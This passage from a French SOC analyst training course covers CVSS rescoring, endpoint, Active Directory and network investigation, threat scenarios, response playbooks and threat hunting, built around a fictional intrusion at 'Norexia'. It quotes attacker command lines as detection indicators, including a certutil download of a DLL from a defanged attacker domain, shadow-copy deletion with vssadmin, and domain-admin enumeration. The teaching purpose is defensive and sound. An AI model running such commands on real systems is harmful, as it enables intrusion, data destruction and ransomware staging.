(2) **Appliquer les métriques Threat** : l'exploit est-il public (PoC sur GitHub, Exploit-DB) ? Est-il observé in-the-wild (KEV — Known Exploited Vulnerabilities de la CISA, bulletins CTI, signalements internes) ? → Exploit Maturity = Attacked si exploitation confirmée. Le score passe de CVSS-B à CVSS-BT.

(3) **Appliquer les métriques Environmental** : le service vulnérable est-il exposé sur Internet ou uniquement en interne ? (Modified Attack Vector). Des contrôles compensatoires sont-ils en place — WAF, segmentation, MFA, EDR ? (Modified Privileges Required, Modified User Interaction). Les données derrière le service sont-elles critiques pour le métier ? (Security Requirements CIA : High/Medium/Low). → Le score passe de CVSS-BT à CVSS-BTE.

(4) **Comparer les trois lectures** : le score externe (ce que dit l'éditeur), le score contextuel interne (ce que dit la réalité de l'environnement), et la gravité IR de l'incident (ce que dit l'impact opérationnel). Les trois sont documentés dans la fiche d'incident.

#### 12.5 Ce que le rescoring contextuel NE fait PAS

Le rescoring contextuel CVSS ne remplace pas la qualification de gravité IR (P1/P2/P3/P4), qui reste une évaluation business et opérationnelle. Le FAQ FIRST rappelle que le score numérique seul ne porte pas tout le contexte — les métriques Environmental concernent le système vulnérable dans son environnement, pas la vulnérabilité « dans l'absolu ».

Un incident peut être P1 (gravité maximale) même si la CVE exploitée a un CVSS-BTE de 6.5 — parce que l'attaquant a pivoté vers des systèmes critiques après l'exploitation initiale. Inversement, un incident peut être P3 même si la CVE a un CVSS-B de 9.8 — parce que l'exploitation a été détectée et contenue immédiatement, sur un système non critique, sans propagation.

#### 12.6 Ce que le rescoring contextuel SERT à faire

Il sert à **éclairer les décisions** pendant et après l'incident : priorisation du patching (quelle instance de la même vulnérabilité patcher en premier — celle avec le CVSS-BTE le plus élevé), extension du hunting (chercher l'exploitation de la même CVE sur d'autres systèmes — en priorisant les systèmes avec le CVSS-BE le plus élevé), périmètre de remédiation (les systèmes où la vulnérabilité est fortement compensée peuvent attendre ; ceux où elle est pleinement exposée sont P0), et plan de durcissement post-incident (le rescoring du backlog de vulnérabilités révèle les autres expositions critiques dans l'environnement réel).

En résumé : trois informations distinctes, trois usages distincts, documentées ensemble dans la fiche d'incident.

| Information | Question | Usage |
|-------------|----------|-------|
| Score CVSS-B externe (éditeur/NVD) | La vulnérabilité est-elle sévère en général ? | Référence, communication, comparaison |
| Score CVSS-BTE contextuel interne | La vulnérabilité est-elle sévère CHEZ NOUS ? | Priorisation patching, hunting, remédiation |
| Gravité IR de l'incident (P1-P4) | L'incident est-il grave pour l'organisation ? | Escalade, mobilisation, SLA, communication de crise |

---
### Chapitre 13 — Investigation endpoint

*Le chapitre le plus dense de la partie — investigation complète sur un endpoint compromis, pas à pas, avec les requêtes réelles et les résultats.*

Le workflow d'investigation endpoint appliqué au fil rouge FALCONWATCH.

**Étape 1 — Lecture de l'alerte EDR :** l'alerte CrowdStrike montre le process tree complet. Karim identifie la chaîne `WINWORD.EXE → cmd.exe → certutil.exe → rundll32.exe`. Chaque processus est examiné : PID, arguments de ligne de commande, hash, connexions réseau, fichiers créés.

**Étape 2 — Reconstitution du process tree complet dans le SIEM :** requête SPL sur les logs Sysmon Event 1 pour WKS-PROD-112 sur les dernières 24h :
```
index=sysmon host="WKS-PROD-112" EventCode=1 
| eval parent=ParentImage." (PID:".ParentProcessId.")"
| eval child=Image." (PID:".ProcessId.")"
| table _time parent child CommandLine User
| sort _time
```
Le résultat montre la séquence complète avec les timestamps — et révèle un processus supplémentaire que l'alerte EDR n'avait pas mis en avant : après le rundll32, un `cmd.exe → whoami /all` puis un `cmd.exe → net group "Domain Admins" /domain` — reconnaissance post-exploitation.

**Étape 3 — Analyse des connexions réseau du processus malveillant :** requête Sysmon Event 3 :
```
index=sysmon host="WKS-PROD-112" EventCode=3 
  ProcessId=9284
| table _time DestinationIp DestinationPort Protocol
```
Résultat : connexion HTTPS vers `185.xx.xx.xx:443` toutes les 45 secondes — beaconing C2 confirmé.

**Étape 4 — Scope assessment :** la compromission est-elle limitée à ce poste ? Requête EDR pour le hash de lib.dll sur tout le parc Norexia :
```
index=sysmon EventCode=7 SHA256="a7f3e2d8..." 
| stats count by host
```
Résultat : 0 match sur les autres postes. Requête firewall pour les connexions vers le C2 :
```
index=firewall dest_ip="185.xx.xx.xx" 
| stats count by src_ip
| sort -count
```
Résultat : 2 IP sources — `10.0.5.112` (WKS-PROD-112, connu) et `10.0.3.45` (WKS-IT-045, **nouveau** — mouvement latéral découvert).

---

### Chapitre 14— Investigation identité et Active Directory

Investigation des compromissions d'identité appliquée au fil rouge.

**Détection du mouvement latéral :** Event ID 4624 type 3 sur WKS-IT-045 depuis `10.0.5.112` (WKS-PROD-112) avec le compte `marc.dubois` :
```
index=windows host="WKS-IT-045" EventCode=4624 LogonType=3 
| table _time TargetUserName IpAddress LogonType AuthenticationPackageName
```
Suivi immédiatement d'un Event ID 7045 (service PSEXESVC installé) — confirmation que PsExec a été utilisé pour le mouvement latéral.

**Détection du Kerberoasting :** Event ID 4769 sur DC01 avec encryption type 0x17 depuis WKS-PROD-112 :
```
index=windows host="DC01" EventCode=4769 TicketEncryptionType=0x17 
| stats count values(ServiceName) by IpAddress
| where count > 5
```
Résultat : 8 comptes de service ciblés, dont `svc-scada` (compte avec accès aux systèmes de supervision industrielle). L'attaquant a demandé des tickets Kerberos RC4 pour craquer les mots de passe offline. **C'est le moment pivot** : si `svc-scada` est cracké, l'attaquant a accès au réseau OT. Escalade immédiate.

**Vérification des modifications AD :** Event ID 5136 (modifications d'objets LDAP) et 4728/4732 (ajouts à des groupes) sur le DC dans la fenêtre temporelle de l'incident — aucune modification détectée. L'attaquant n'a pas encore utilisé le compte svc-scada — il est encore en phase de cracking offline.

---

### Chapitre 15 — Investigation réseau

Les logs réseau complètent l'investigation endpoint et identité.

**Analyse du beaconing C2 :** les logs proxy montrent les connexions HTTPS vers `185.xx.xx.xx` avec un pattern temporel régulier (intervalle de 45 secondes ± 3 secondes). Le user-agent est `Mozilla/5.0 (Windows NT 10.0; Win64; x64) NorexiaUpdate/1.0` — un user-agent custom qui imite un navigateur légitime mais avec un suffixe inhabituel.

**Recherche d'exfiltration :** les logs proxy montrent qu'à J+1 (dimanche), le poste WKS-IT-045 (le second poste compromis — poste d'un admin IT) a lancé `rclone.exe` qui a uploadé 12 Go de données vers un bucket S3 externe. Le SRUM (System Resource Usage Monitor) sur WKS-IT-045 confirme que `rclone.exe` a consommé 12.3 Go de bande passante réseau en 4 heures.

**Reconstruction de la timeline réseau :** corrélation firewall + proxy + DNS pour reconstituer les communications de l'attaquant heure par heure. Les résolutions DNS montrent que `update-norexia[.]xyz` a été résolu pour la première fois samedi à 08h12 UTC (le moment du phishing initial) — 23 heures avant la détection par l'EDR lundi à 07h42.

---

### Chapitre 16 — Investigation cloud et SaaS

Ce chapitre développe l'investigation dans les environnements M365/Azure et AWS avec des requêtes concrètes. Scénario BEC complet (phishing AitM → token replay → forwarding rule → exfiltration SharePoint → phishing interne) avec les requêtes KQL Sentinel à chaque étape. Scénario AWS (access keys compromises → CloudTrail analysis → modification de security groups → lancement d'instances). Le défi de la corrélation cloud ↔ on-premise quand l'attaquant pivote entre les deux mondes.

---

### Chapitre 17 — Construction de timeline multi-sources

La timeline multi-sources fusionne les événements de toutes les sources (EDR + SIEM + proxy + firewall + AD + email gateway + cloud) en une séquence chronologique unique. C'est le livrable le plus puissant de l'investigation — c'est aussi le plus exigeant à construire.

Les étapes de construction : normalisation des timestamps en UTC, identification des sources pertinentes pour chaque phase de l'attaque, extraction des événements clés par requête SIEM, fusion dans un format tabulaire (heure UTC | source | machine | utilisateur | action | détail), et analyse de la séquence (patterns, corrélations, lacunes). Les lacunes sont aussi informatives que les événements — un trou de 6 heures entre le mouvement latéral et l'exfiltration pose la question : l'attaquant était-il inactif, ou les logs manquent-ils ?

Fil rouge : Karim construit la timeline FALCONWATCH de 48 heures, qui révèle que l'attaquant a agi en 4 phases distinctes : samedi 08h-10h (phishing + infection initiale), samedi 22h-01h (reconnaissance + mouvement latéral), dimanche 06h-10h (Kerberoasting + staging des données R&D), lundi 04h-07h (suppression des shadow copies sur 3 machines + déploiement du binaire ransomware — non exécuté avant la détection EDR à 07h42).

---

### Chapitre 18 — Pièges, faux positifs et erreurs d'investigation

Les erreurs les plus fréquentes et comment les éviter, illustrées par des cas concrets. Timezones (le piège n°1 — un log proxy en heure locale Paris et un log firewall en UTC créent un décalage fantôme de 1-2h). NAT/proxy/VPN (l'IP source dans les logs firewall peut être le proxy, pas le poste — toujours croiser avec les logs d'authentification pour identifier la machine réelle). Comptes de service (bruit massif, logons réseau en continu, horaires atypiques — les baseliner mais surveiller tout changement : un compte de service qui fait du Kerberoasting, c'est anormal). DHCP et rotation d'IP (l'IP 10.0.5.112 était-elle attribuée à WKS-PROD-112 au moment de l'alerte ? vérifier les baux DHCP). Multi-sessions RDP (sur un serveur RDS, plusieurs utilisateurs partagent la même IP — le session ID est nécessaire pour identifier l'auteur). Scanners de vulnérabilité (Nessus, Qualys — exclure les IP sources dans les règles IDS/IPS, documenter l'exclusion). Le biais de confirmation (l'analyste qui pense « phishing » arrête de chercher des alternatives — peut-être que le document était légitime et l'alerte est un FP sur une macro inoffensive). Et le benign true positive (l'admin IT qui utilise PsExec légitime — la détection est correcte, l'action est bénigne, c'est un BTP pas un FP).

---

## PARTIE IV — USE CASES : SCÉNARIOS DE MENACE

*Chaque use case est un chapitre complet qui enseigne un grand schéma de menace avec sa logique de détection et sa réponse. La Partie III enseignait les méthodes d'investigation par domaine (endpoint, identité, réseau, cloud). La Partie IV enseigne comment ces méthodes s'appliquent face à chaque type de menace.*

---

### Chapitre 19 — Phishing et compromission de credentials

Le scénario complet, de l'email malveillant à la post-exploitation. L'email de phishing arrive (détection email gateway — liens suspects, pièces jointes malveillantes, SPF/DKIM/DMARC fail, domaine de typosquatting). L'utilisateur clique sur le lien (détection proxy — accès à une URL catégorisée « phishing » ou vers un domaine récemment enregistré). L'utilisateur soumet ses credentials sur le faux portail (détection proxy — POST vers un domaine suspect après un clic depuis un email). L'attaquant se connecte avec les credentials volées (détection Azure AD — connexion depuis une nouvelle IP/géolocalisation, sans le device habituel, potentiellement sans MFA si token replay). Post-exploitation : création de règle de forwarding Outlook (détection UAL — `New-InboxRule` avec `ForwardTo`), accès aux données SharePoint/OneDrive (détection UAL — `FileDownloaded` en volume), envoi de phishing interne depuis le compte compromis (détection email gateway — le même compte envoie des emails inhabituels à de nombreux destinataires).

Règle Sigma pour la détection de forwarding rule suspecte. Playbook complet : scope (d'autres ont-ils reçu le même email ?), vérification des clics (proxy), vérification des soumissions de credentials (POST dans le proxy), reset credentials + révocation de sessions + révocation de refresh tokens si compromission confirmée, vérification des inbox rules, blocage du domaine/URL au proxy et à l'email gateway, notification et sensibilisation de l'utilisateur.

Variante AitM : le kit de phishing (EvilGinx2, Modlishka) intercepte le token de session MFA en temps réel — la détection par anomalie post-authentification (nouvelle IP, absence de device enrollment, changement de comportement) remplace la détection par absence de MFA.

---

### Chapitre 20 — Mouvement latéral et escalade de privilèges

Les techniques de mouvement latéral avec leurs artefacts de détection. **PsExec** : Event ID 7045 (service PSEXESVC installé sur la machine destination), 4624 type 3 (logon réseau depuis la machine source), et le Prefetch de psexec.exe sur la machine source. **WMI** : Event ID 4688 avec `wmiprvse.exe` comme parent sur la machine destination, et les logs WMI-Activity/Operational. **RDP** : Event IDs 21/22/25 dans le canal TerminalServices-RemoteConnectionManager, 4624 type 10, et le bitmap cache RDP. **SMB lateral movement** : Event ID 5140 (accès à un partage — notamment ADMIN$, C$, IPC$), 5145 (audit granulaire d'accès aux fichiers partagés).

Les techniques d'escalade de privilèges. **Kerberoasting** (4769 avec encryption RC4 en rafale), **AS-REP Roasting** (4768 sans pré-authentification), **DCSync** (4662 avec les GUID de réplication depuis une machine qui n'est PAS un DC). Chaque technique avec sa règle Sigma commentée.

La difficulté opérationnelle : distinguer l'admin IT légitime de l'attaquant. PsExec est utilisé quotidiennement par l'IT — la détection repose sur le contexte (PsExec depuis un poste non-IT, vers un serveur critique, à 3h du matin, avec un compte compromis = suspect) et sur la corrélation avec d'autres indicateurs (PsExec + accès LSASS + Kerberoasting = chaîne d'attaque, pas administration légitime).

---

### Chapitre 21 — Exécution et persistence malveillante

Détection de l'exécution suspecte : PowerShell obfusqué (`-EncodedCommand`, `Invoke-Expression` avec download, `-WindowStyle Hidden`), LOLBins (certutil `-urlcache`, mshta avec URL, bitsadmin `/transfer`, regsvr32 `/s /u /n /i:` — chaque binaire légitime détourné avec sa signature de détection et ses faux positifs), et process trees anormaux (svchost.exe avec un parent qui n'est pas services.exe, rundll32.exe sans argument — indicateurs de process injection ou de process hollowing).

Détection de la persistence : clés registre Run/RunOnce (Event ID 13 Sysmon — modification de registre), services Windows (Event ID 7045 — installation de service, avec attention aux services avec des chemins d'exécutable dans des répertoires temporaires ou des noms aléatoires), tâches planifiées (Event ID 4698 — création, avec analyse du contenu XML de la tâche), WMI event subscriptions (les plus discrètes — détectables via `Get-WMIObject -Namespace root\Subscription`), et DLL sideloading (Event ID 7 Sysmon — DLL non signée chargée dans le répertoire d'une application légitime).

---

### Chapitre 22 — Exfiltration et communication C2

Détection de l'exfiltration : volume anormal de données sortantes (agrégation par utilisateur et destination dans les logs proxy/firewall — un utilisateur qui uploade 12 Go vers mega.nz en 4 heures n'est pas un comportement normal), upload vers des services de partage (détection par catégorisation proxy ou par domaine — mega.nz, transfer.sh, anonfiles, gofile), DNS tunneling (entropie élevée des sous-domaines, volume de requêtes vers un domaine unique, taille inhabituelle des réponses DNS), et rclone/cloud sync (détection de l'exécutable par hash ou nom de processus, ou de ses patterns de connexion vers des endpoints S3/Azure Blob/GDrive).

Détection du C2 : beaconing (analyse statistique des intervalles de connexion — un processus qui contacte une IP avec un intervalle régulier de 45 secondes ± 5 % est un automate ; requête SPL/KQL avec calcul de moyenne et d'écart-type des intervalles), JA3/JA4 fingerprints (le JA3 d'un RAT custom est différent de celui d'un navigateur Chrome — détectable même sur du trafic chiffré), domaines DGA (entropie élevée et longueur anormale du domaine — les algorithmes de génération produisent des domaines comme `xj7kzp2m9q.xyz`), et connexions vers des IP sans domaine associé (les serveurs C2 sont souvent des VPS sans nom de domaine légitime — une connexion HTTPS vers une IP nue est suspecte).

---

### Chapitre 23 — Ransomware : détection pré-déploiement et réponse

Le ransomware est la dernière étape d'une chaîne d'attaque — les précurseurs sont détectables si le SOC sait quoi chercher. Les **précurseurs** (détectables heures à jours avant le chiffrement) : reconnaissance interne (scans réseau avec Advanced IP Scanner, énumération AD avec BloodHound/ADFind/nltest/`net group "Domain Admins" /domain`), mouvement latéral (PsExec, RDP, SMB — voir Ch.18), désactivation des défenses (arrêt de l'antivirus via PowerShell ou GPO, modification des GPO de sécurité, suppression des shadow copies — `vssadmin delete shadows /all` est un signal critique quasi-pathognomonique du pré-ransomware), et staging de données (copie vers un serveur de staging avant exfiltration — double extorsion).

La **golden hour** : les 1 à 4 heures entre le mouvement latéral confirmé et le déploiement du ransomware. C'est la fenêtre de détection critique. Si le SOC détecte et confine pendant cette fenêtre, le ransomware est évité. Si la fenêtre est ratée, le chiffrement commence et les options se réduisent.

Playbook ransomware : isolation immédiate des machines détectées (EDR containment), isolation réseau du segment (firewall — couper les communications entre segments pour empêcher la propagation), vérification de l'étendue (quelles machines contactent le C2 ? quelles machines ont eu des shadow copies supprimées ?), préservation des preuves (ne pas redémarrer, ne pas nettoyer), et escalade IR immédiate.

---

## PARTIE V — RÉPONSE OPÉRATIONNELLE

*La réponse de premier et deuxième niveau — ce que le SOC fait avant et pendant l'escalade IR.*

---

### Chapitre 24 — Playbooks et procédures de réponse

Un playbook est une procédure structurée pour un type d'incident spécifique. Ce n'est pas un script rigide — c'est un guide qui garantit la cohérence entre analystes (deux analystes face au même incident doivent prendre les mêmes actions essentielles), la complétude (aucune étape critique n'est oubliée sous la pression), et la traçabilité (chaque action est documentée dans le ticket).

Structure d'un playbook : conditions de déclenchement (quelle alerte, quelle qualification), étapes de vérification (comment confirmer le VP), actions de confinement (isolation, blocage, reset), actions d'éradication (suppression du malware, nettoyage de la persistence), communication (qui informer, à quel moment, dans quel format), critères d'escalade (quand basculer vers l'IR/CERT), et clôture (documentation, REX, mise à jour des IoC).

L'articulation playbook → SOAR : les étapes automatisables du playbook sont implémentées dans le SOAR (enrichissement automatique, blocage d'IoC, création de ticket) ; les étapes de jugement restent humaines (qualification VP/FP, décision de confinement impactant, escalade).

---

### Chapitre 25 — Confinement : actions de premier niveau

Les actions que l'analyste SOC peut exécuter (selon les droits définis dans la politique de réponse du client/de l'organisation).

**Isolation endpoint via EDR :** CrowdStrike Falcon (Network Containment — l'endpoint est coupé du réseau mais reste joignable par le cloud CrowdStrike pour la collecte et les commandes), SentinelOne (Disconnect from Network), MDE (Isolate Device). L'isolation est l'action de confinement la plus efficace et la plus rapide — elle coupe immédiatement les communications de l'attaquant.

**Blocage d'IoC :** ajout de domaines C2, d'IP, et de hash aux listes de blocage du proxy, du firewall, et de l'EDR. Procédure : vérifier que l'IoC est confirmé (ne pas bloquer une IP Google parce qu'elle apparaît dans une alerte de beaconing), documenter le blocage (qui, quand, pourquoi, IoC exact), et vérifier l'effet (le trafic vers l'IoC est-il effectivement bloqué ?).

**Reset de credentials :** reset du mot de passe AD + révocation des sessions Azure AD/M365 (via PowerShell `Revoke-AzureADUserAllRefreshToken` ou portail Entra ID) + invalidation des tokens Kerberos (le reset du mot de passe AD ne suffit pas si l'attaquant a un TGT valide — il faut réinitialiser le mot de passe du compte krbtgt deux fois pour invalider les Golden Tickets, mais cette action est réservée à l'IR lead car elle impacte tout le domaine).

**Désactivation de compte :** en cas de compromission confirmée — le compte est désactivé dans l'AD et les sessions sont révoquées immédiatement.

---

### Chapitre 26 — Communication, escalade et rédaction du ticket SOC

#### 26.1 Le situation report (SITREP)

Quand escalader, le format est : **Quoi** (résumé en 2 phrases — « Compromission confirmée de WKS-PROD-112 chez Norexia, mouvement latéral détecté vers WKS-IT-045, Kerberoasting ciblant le compte svc-scada avec accès SCADA »), **Quand** (timeline résumée — « Infection initiale samedi 08h12, mouvement latéral samedi 22h30, Kerberoasting dimanche 06h15, détection lundi 07h42 »), **Qui** (comptes et systèmes impactés — « Comptes : marc.dubois, svc-scada (non confirmé cracké). Machines : WKS-PROD-112, WKS-IT-045. Potentiel : accès SCADA »), **Actions prises** (« Isolation des 2 postes via EDR, blocage du C2, reset mot de passe marc.dubois »), **Actions recommandées** (« Reset svc-scada, audit des accès SCADA, investigation forensique complète, notification RSSI Norexia »), **Ce qu'on ne sait pas encore** (« Le mot de passe svc-scada a-t-il été cracké ? L'attaquant a-t-il accédé au réseau OT ? Y a-t-il d'autres machines compromises ? »).

#### 26.2 Le ticket SOC : un livrable professionnel

Un ticket SOC bien rédigé est la trace de l'investigation. Il doit être compréhensible par un collègue qui ne connaît pas le contexte, reproductible (un autre analyste peut refaire les mêmes requêtes), et factuel (faits horodatés, pas de spéculation non qualifiée).

Structure du ticket : **Résumé** (1-2 phrases : quoi, qui, quand — « Alerte certutil download cradle sur WKS-PROD-112, qualification : vrai positif, infection par document Office malveillant avec RAT custom et beaconing C2 »). **Contexte** (règle déclenchée, sévérité, asset concerné, utilisateur). **Observations** (faits extraits des logs, horodatés, avec la source et la requête SIEM — « 07h42:15 UTC — Sysmon Event 1 — certutil.exe PID 9215, parent cmd.exe PID 9201, parent WINWORD.EXE PID 8412. CommandLine : certutil -urlcache -split -f hxxps://update-norexia[.]xyz/lib.dll C:\Users\Public\lib.dll »). **Analyse** (hypothèses testées et conclusions — « L'utilisateur a ouvert un document Word piégé contenant une macro qui a déclenché un download cradle via certutil. Le fichier téléchargé est un RAT custom (SHA-256 : a7f3..., 0 détection VT) qui communique via HTTPS avec le C2 185.xx.xx.xx. »). **Actions réalisées** (ce que l'analyste a fait — isolation, blocage, reset). **Recommandations** (ce qui reste à faire — forensique, scope élargi, notification). **Statut** (Ouvert / Escalé / Clos — avec la qualification finale : VP, FP, BTP).

Un bon ticket se lit comme un rapport d'investigation condensé — pas comme une liste de copier-coller de logs sans contexte.

---

### Chapitre 27 — Collecte d'artefacts et préservation de preuves

Le SOC collecte, le CERT/forensicien analyse. Ce que l'analyste SOC doit savoir collecter : triage **KAPE** (collecte automatisée des artefacts Windows critiques — Event Logs, registre, Prefetch, Amcache, $MFT, navigateurs — en 5-10 minutes via une clé USB ou via le réseau), dump mémoire (DumpIt, WinPmem — si la machine est allumée et que le contenu de la RAM est critique — credentials en mémoire, processus malveillants), collecte via **Velociraptor** (hunts et collectes à distance sur le parc — VQL pour cibler les artefacts spécifiques sans intervention physique), et export de logs (les logs SIEM/proxy/firewall de la période de l'incident, archivés et hashés pour la chaîne de custody).

La chaîne de custody simplifiée : même en investigation interne, documenter qui a collecté quoi, quand, comment, et hasher (SHA-256) chaque artefact. L'affaire peut basculer en judiciaire si l'ampleur est révélée — et les preuves collectées sans rigueur au début sont inexploitables devant un tribunal. Renvoi vers le cours Forensic de la bibliothèque pour le détail de la méthodologie forensique.

---

### Chapitre 28 — Post-incident : REX, tuning et amélioration

Le REX (Retour d'Expérience / Lessons Learned) est la phase la plus négligée et la plus rentable du cycle d'incident. Structure : ce qui s'est passé (résumé factuel), comment ça a été détecté (quelle règle, quel délai, quel analyste), ce qui a fonctionné (quelle action de confinement a été efficace, quel playbook a bien guidé la réponse), ce qui n'a pas fonctionné (quels gaps de détection, quels logs manquants, quels délais excessifs), et les améliorations à apporter (nouvelles règles, nouvelles sources de logs, mise à jour de playbooks, formation).

Le tuning post-incident : les règles qui n'ont pas détecté l'attaque → nouvelles règles Sigma à créer (dans FALCONWATCH : le mouvement latéral PsExec n'a pas été détecté en temps réel parce que la règle existante excluait le compte marc.dubois comme « utilisateur IT autorisé » → l'exception est revue, le compte est retiré de l'exclusion), les sources de logs manquantes → collecte à ajouter (Sysmon n'était pas déployé sur les postes OT chez Norexia → recommandation de déploiement), et les playbooks à mettre à jour (le playbook ransomware est enrichi avec les étapes de vérification des shadow copies et de scope assessment SCADA).

---

### Chapitre 29 — Gestion d'un flux d'alertes : priorisation et endurance

Le quotidien de l'analyste SOC n'est pas une investigation unique — c'est un flux continu d'alertes de sévérités et de contextes variés. La gestion de ce flux est une compétence en soi.

La **priorisation** : les alertes critiques sont traitées immédiatement (< 15 minutes), les hautes dans l'heure, les moyennes dans les 4 heures, les basses en fin de shift si le temps le permet. Le backlog (alertes en attente) est monitoré en temps réel — un backlog qui grandit est un signal de surcharge.

La **fatigue d'alerte** est le piège le plus insidieux : un SOC qui génère 500 alertes/jour dont 400 FP crée les conditions de l'échec — les analystes ne regardent plus les alertes, et le VP noyé dans les FP n'est pas vu. La lutte contre la fatigue passe par le tuning agressif des règles (Ch.7), l'automatisation du triage des alertes de faible valeur (SOAR — Ch.31), la rotation des tâches (pas toujours du triage, alterner avec du hunting ou du detection engineering), et la communication avec le management (la fatigue d'alerte est un problème organisationnel, pas individuel).

L'**hygiène mentale** : le SOC est un environnement à haute pression (décisions sous contrainte de temps, alertes en continu, travail en shift). Les bonnes pratiques : pause entre les séries d'alertes, rotation des rôles, formation continue pour maintenir la motivation, communication des frustrations, et reconnaissance du travail bien fait (un VP détecté et confiné rapidement mérite d'être célébré).

---

## PARTIE VI — THREAT HUNTING

*La recherche proactive de menaces que les règles de détection n'ont pas vues — la compétence qui distingue l'analyste avancé.*

---

### Chapitre 30 — Fondamentaux du Threat Hunting

Le hunting est la recherche proactive de menaces non détectées. L'analyste formule une hypothèse (basée sur la CTI, un rapport, une intuition, ou une anomalie observée) et la teste dans les données. Le hunting ne remplace pas la détection automatisée — il la complète en couvrant les angles morts (les techniques non couvertes par des règles, les variantes non anticipées, les comportements trop subtils pour les seuils automatiques).

Les approches : **hypothesis-driven** (la CTI fournit une hypothèse — « l'acteur X utilise le DLL sideloading sur les applications de supervision » → le hunter cherche), **data-driven** (l'analyste explore les données à la recherche d'anomalies — outliers, distributions inhabituelles, nouveaux patterns), et **intelligence-driven** (les IoC et TTP d'un rapport CTI sont recherchés proactivement dans les logs historiques — rétro-hunt).

Le processus : hypothèse → requête → résultats → analyse → conclusion (compromission trouvée → escalade IR et enrichissement du profil ; rien trouvé → enrichissement de la baseline, documentation, nouvelle hypothèse). Un hunt qui ne trouve rien n'est PAS un échec — il enrichit la connaissance de l'environnement (les « normaux » découverts pendant le hunt réduisent les futurs FP) et renforce la confiance dans la posture.

---

### Chapitre 31 — Techniques de hunting concrètes

**Stacking :** agrégation et comptage pour identifier les outliers. « Quels sont les processus les plus rares exécutés sur les postes du parc cette semaine ? » → requête SPL :
```
index=sysmon EventCode=1 earliest=-7d 
| stats count by Image 
| sort count 
| head 20
```
Les processus avec 1-2 occurrences sur 500 postes méritent investigation — pourquoi un seul poste exécute-t-il ce binaire ?

**Frequency analysis pour le beaconing :** analyse des intervalles de connexion d'un processus vers une destination. Requête SPL :
```
index=proxy src_ip="10.0.5.112" dest="185.xx.xx.xx" 
| sort _time 
| streamstats current=f last(_time) as prev_time 
| eval interval=_time-prev_time 
| stats avg(interval) as avg_int stdev(interval) as std_int count by src_ip dest
| eval jitter_pct=(std_int/avg_int)*100
| where jitter_pct < 15 AND count > 50
```
Un intervalle moyen régulier (ex : 45 secondes) avec un jitter faible (< 15 %) est un indicateur fort de beaconing automatisé.

**Long tail analysis :** les événements rares dans les distributions — les domaines DNS avec 1-2 requêtes dans tout le parc, les user-agents avec 1-2 occurrences, les connexions vers des pays inhabituels. Ces outliers sont souvent du bruit légitime — mais occasionnellement, c'est un C2 discret qui n'a contacté qu'une seule machine.

**Hunt sur les LOLBins :** recherche d'utilisations suspectes de certutil, mshta, bitsadmin, regsvr32, rundll32 — en contexte. L'outil est légitime, c'est le contexte qui distingue l'usage malveillant : qui exécute (un utilisateur standard, pas un admin), depuis quel processus parent (winword.exe, pas cmd.exe lancé manuellement), avec quels arguments (certutil -urlcache -f, pas certutil -verify), et à quelle heure.

---

### Chapitre 32 — Purple teaming et validation de détection

Le purple team est la collaboration structurée entre l'offensive (red team) et la défensive (SOC) pour valider l'efficacité des détections. Le processus : le red team exécute une technique ATT&CK spécifique (par exemple T1059.001 PowerShell -EncodedCommand) → le SOC vérifie si l'alerte s'est déclenchée → si oui : la détection fonctionne, documenter → si non : gap identifié, la règle est créée ou corrigée → le test est rejoué pour valider.

**Atomic Red Team** (Red Canary, open source) est la bibliothèque de tests unitaires par technique ATT&CK — chaque test est un script exécutable en un clic qui simule une technique d'attaque spécifique (pas un exploit réel — une simulation safe qui génère les mêmes artefacts de détection). L'analyste SOC peut exécuter un test Atomic RT et vérifier dans son SIEM si l'alerte se déclenche — sans avoir besoin d'un red teamer.

Le cycle purple team comme processus d'amélioration continue : 2 techniques testées par semaine, documentées, avec le résultat (détecté / non détecté / partiellement détecté), les actions correctives (règle créée, règle modifiée, log source ajouté), et la re-validation. En 6 mois, un programme purple team régulier améliore dramatiquement la couverture ATT&CK du SOC.

---

## PARTIE VII — SOC AVANCÉ ET MATURITÉ

---

### Chapitre 33 — Automatisation SOC et SOAR

Ce qui doit être automatisé : l'enrichissement des alertes (hash → VirusTotal, IP → réputation/géo, domaine → Whois/PDNS, user → CMDB/criticité — ces actions sont répétitives, à faible valeur analytique, et réalisées des dizaines de fois par shift), la création de tickets (chaque alerte génère automatiquement un ticket avec les informations de contexte), la notification (les parties prenantes sont alertées automatiquement selon la sévérité), et les actions de confinement à faible risque (blocage d'IoC confirmé au proxy, quarantaine de fichier malveillant).

Ce qui ne doit PAS être automatisé : les décisions de confinement à fort impact (isolation réseau d'un segment de production, reset du mot de passe du CEO — un humain décide), les conclusions d'investigation (la qualification VP/FP/BTP — un humain évalue), et l'escalade (un humain décide quand et comment escalader).

Le piège de la sur-automatisation : automatiser sans comprendre crée des incidents (un playbook qui isole automatiquement tout endpoint avec un score de risque > 80 peut isoler le poste du RSSI parce qu'un scan de vulnérabilité légitime a fait monter le score).

---

### Chapitre 34 — Vulnerability Operations : le SOC et la réduction proactive du risque

*Ce chapitre couvre l'extension du périmètre SOC vers la gestion proactive des vulnérabilités — une tendance structurelle des SOC modernes.*

#### 34.1 Le VOC comme extension naturelle du SOC

Traditionnellement, le vulnerability management (scan, priorisation, patching) est un processus séparé du SOC. Mais la convergence est en cours : les vulnérabilités activement exploitées in the wild sont du renseignement de menace (CTI), et la réponse à ces vulnérabilités est une action de sécurité opérationnelle (SOC). Le VOC (Vulnerability Operations Center, ou la fonction « vuln ops » intégrée au SOC) fait le pont.

#### 34.2 Priorisation basée sur le risque réel

Le CVSS mesure la sévérité technique d'une vulnérabilité — pas le risque réel pour l'organisation. Un CVSS de 9.8 sur une technologie que l'organisation n'utilise pas a un risque réel de zéro. Un CVSS de 7.5 sur le VPN Ivanti exposé sur Internet et activement exploité par Volt Typhoon a un risque réel critique.

La priorisation basée sur le risque réel croise trois dimensions. L'**exploitabilité** : la vulnérabilité est-elle exploitée in the wild ? Le **CISA KEV** (Known Exploited Vulnerabilities catalog) est la référence — si la CVE est dans le KEV, elle est exploitée. L'**EPSS** (Exploit Prediction Scoring System) calcule la probabilité d'exploitation dans les 30 jours. L'**exposition** : l'organisation utilise-t-elle la technologie affectée ? L'asset est-il exposé sur Internet ? Est-il critique (OIV, serveur de production, DC) ? Le **contexte de menace** (fourni par la CTI) : quelle CVE est exploitée par quel acteur, contre quel profil de cible ? « CVE-2024-21887 exploitée par des clusters étatiques ciblant les opérateurs d'énergie européens » → si vous êtes un opérateur d'énergie européen avec des Ivanti exposés, c'est votre priorité n°1.

#### 34.3 L'articulation SOC ↔ vuln management ↔ CTI

